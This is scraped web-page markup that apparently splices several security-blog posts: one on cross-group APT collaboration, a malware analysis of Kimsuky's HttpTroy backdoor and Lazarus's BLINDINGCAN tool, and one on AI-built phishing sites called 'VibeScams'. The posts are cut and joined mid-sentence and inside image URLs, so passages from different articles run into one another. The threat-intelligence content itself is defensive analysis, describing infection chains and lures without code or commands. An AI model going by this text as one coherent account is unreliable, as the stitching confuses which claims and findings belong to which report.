420px)","type":"image/webp","width":690,"height":65}],"caption":"","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2025-11/2.png.webp?itok=GAkzCR6x","link":""}]},{"bundle":"rich_text","content":"\u003ch2\u003eA new phase in cyber geopolitics\u0026nbsp;\u003c/h2\u003e\u003cp\u003eThe evidence of infrastructure overlap between Lazarus and Gamaredon represents a significant development in the global threat landscape. Historically, cross-country APT collaborations have been exceedingly rare, with only a handful of confirmed cases such as Stuxnet and Regin. This potential partnership signals a shift toward more complex and unpredictable alliances, where geopolitical interests may drive operational convergence.\u0026nbsp;\u003c/p\u003e\u003cp\u003eWhile the Lazarus–Gamaredon case stands out for its strategic implications, the observed intranational collaborations, such as Lazarus with Kimsuky and DoNot with SideWinder, are equally important. These partnerships demonstrate a growing trend of resource sharing and tactical alignment within national ecosystems, amplifying the reach and resilience of state-sponsored campaigns.\u0026nbsp;\u003c/p\u003e\u003cp\u003eFor defenders, these findings underscore an urgent need to adapt detection strategies beyond single-actor attribution. Shared infrastructure, overlapping TTPs, and modular malware frameworks mean that traditional attribution models may fail to capture the full scope of risk. Security teams must:\u0026nbsp;\u003c/p\u003e\u003cul\u003e\u003cli\u003eEnhance infrastructure correlation analysis to detect cross-group overlaps early. \u003c/li\u003e\u003cli\u003ePrioritize intelligence sharing across organizations and sectors to identify emerging alliances. \u003c/li\u003e\u003cli\u003eImplement layered defenses capable of mitigating diverse tactics from multiple threat actors leveraging common resources.\u0026nbsp;\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eThe era of isolated APT operations is fading. As adversaries evolve through collaboration, defenders must respond with equal agility and cooperation to safeguard critical recent weeks, our Threat Labs researchers have uncovered two new toolsets that show just how adaptive the DPRK’s operations have become. Kimsuky, known for its espionage-style campaigns, deployed a new backdoor we’ve named \u003cstrong\u003eHttpTroy\u003c/strong\u003e, while Lazarus introduced an upgraded version of its \u003cstrong\u003eBLINDINGCAN\u003c/strong\u003e remote access tool.\u0026nbsp;\u003c/p\u003e\u003cp\u003eBoth attacks reveal the same underlying pattern: stealthy code and layered obfuscation. In this post, we’ll break down how these tools work, what they target and what defenders can learn from the latest moves inside the DPRK playbook.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eInside DPRK’s Latest Campaigns: How Kimsuky and Lazarus Refine Their Playbook\u0026nbsp;\u003c/h2\u003e\u003cp\u003eThe Kimsuky attack targeted a single victim in KR and started with a ZIP file that looked like a VPN invoice, then quietly installed tools that let attackers move files, take screenshots and run commands. The chain has three steps: a small dropper, a loader called MemLoad, and the final backdoor, named “HttpTroy”. We see several signs that possibly tie this activity to Kimsuky: the Korean language lure, an AhnLab-style scheduled task name and command patterns seen in past Kimsuky work.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe Lazarus attack targeted two victims in CA and was caught in the middle of the attack chain, where we observed a new version of the Comebacker malware leading to a new variant of their BLINDINGCAN remote access tool.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eWe’ll explain how these attacks work in plain terms, why North Korea-aligned groups use these tricks, and simple steps you can take to avoid similar threats.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eQuick takeaways for readers:\u003c/strong\u003e do not open any attachments you did not expect, treat .scr files as programs not documents and keep your security software on and updated.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eDiving into the Kimsuky attack: MemLoad and HttpTroy\u0026nbsp;\u003c/h2\u003e\u003ch3\u003eThe Initial dropper\u0026nbsp;\u003c/h3\u003e\u003cp\u003eWhile the exact delivery mechanism remains unknown, telemetry indicates that the samples was obtained via an internet download, packaged within a ZIP archive named “\u003cstrong\u003e250908_A_HK이노션_SecuwaySSL VPN Manager U100S 100user_견적서\u003c/strong\u003e”. Given the nature of the filename, it is highly probable that the archive was distributed through a phishing email.\u0026nbsp;\u003c/p\u003e\u003cp\u003eContained within the archive is a “.scr” file bearing the same name. Execution of this file initiates the entire infection chain.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThis initial sample is a lightweight GO binary containing 3 embedded files. These files are decrypted using a simple XOR operation with the key “0x39”, then written to disk and executed. To maintain user deception, the binary displays a PDF document as a decoy, displaying a fake bill for VPN services, while simultaneously registering the next stage backdoor as a COM server using “regsvr32.exe”. See below an image of the decoy PDF and the decompiled code that decrypts it.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2025-10/1.png.webp?itok=CpfysGBB of the Lazarus Attack: the comeback of Comebacker and the new BLINDINGCAN variant\u0026nbsp;\u003c/h2\u003e\u003ch3\u003eComebacker, yet again\u0026nbsp;\u003c/h3\u003e\u003cp\u003eDuring routine threat monitoring, our team identified a sample indicative of a new variant of the previously documented Comebacker malware, which is attributed to the Lazarus APT group. While our telemetry captures the infection chain from this stage onward, the initial access vector remains unclear. to the era of VibeScams, where creating a phishing site takes just a few clicks. Using simple prompts, scammers can create nearly any type of website almost instantly, without any prior knowledge. Some web-building platforms recreate an entire site from a screenshot provided by the scammer – from a home page to a shopping cart. They typically also allow perfect language localization, letting scammers instantly clone a legitimate site’s look and feel in multiple languages.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThis new wave of AI-driven web building tools has dramatically lowered the barrier to entry for cybercriminals, democratizing access to sophisticated site cloning and scam operations. No longer limited to those with knowledge of HTML, CSS, and JavaScript, these platforms allow anyone with an internet connection to replicate trusted brands, banking portals, or exchange interfaces with alarming fidelity. The ease and speed of this process not only accelerate the proliferation of fraudulent websites but also makes it increasingly difficult for users to distinguish between genuine and malicious websites.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003ch2\u003eA new kind of phishing — VibeScams\u0026nbsp;\u003c/h2\u003e\u003cp\u003eWe call them \u003cem\u003eVibeScams\u003c/em\u003e because the trick isn’t in the code alone — it’s in the feeling. These pages pass the “vibe check”: the right colors, spacing, logo placement, and tiny footer links people trust at a glance. Because AI web builders can recreate that look from a single prompt or screenshot, attackers don’t need coding skills — they only need to get the vibe right. That’s enough to trick people into handing over credentials or cash, and it’s why this wave of scams spreads so fast.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image_inline","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_medium/public/2025-10/vibescams-quote2.png.webp?itok=hmcWRgGN 1x","media":"(min-width: 720px)","type":"image/webp","width":1076,"height":807},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_small/public/2025-10/vibescams-quote2.png.webp?itok=GCsBZTPJ 1x","media":"(min-width: 420px)","type":"image/webp","width":720,"height":540}],"caption":"","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_inline_small/public/2025-10/vibescams-quote2.png.webp?itok=GCsBZTPJ","link":""}]},{"bundle":"rich_text","content":"\u003cp\u003eAs part of our research for this article, we contacted the web builders which attackers leverage more prevalently, according to our detections. By automating templates, layouts, and even content, these tools lower barriers and speed up development, but they also give attackers the same advantages, enabling scams and phishing campaigns with minimal effort.
